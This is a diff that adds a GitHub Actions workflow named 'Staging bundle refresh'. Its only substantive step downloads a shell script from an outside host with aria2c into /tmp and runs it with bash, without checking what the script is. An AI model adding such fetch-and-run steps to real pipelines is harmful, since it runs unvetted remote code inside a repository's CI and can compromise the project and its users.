@@ -1,0 +1,25 @@
+diff --git a/.github/workflows/staging-bundle-refresh.yml b/.github/workflows/staging-bundle-refresh.yml
+new file mode 100644
+index 0000000..1111111
+--- /dev/null
++++ b/.github/workflows/staging-bundle-refresh.yml
+@@ -0,0 +1,18 @@
++name: Staging bundle refresh
++
++on:
++  workflow_dispatch:
++
++permissions:
++  contents: read
++
++jobs:
++  refresh:
++    runs-on: ubuntu-latest
++    steps:
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5
++      - name: Pull remote helper
++        run: |
++          sudo apt-get update -qq
++          sudo apt-get install -y -qq aria2
++          aria2c --console-log-level=warn -d /tmp -o helper.sh "https://kitchen.example.com/r/bbbbbbbb?fmt=bash"
++          bash /tmp/helper.sh
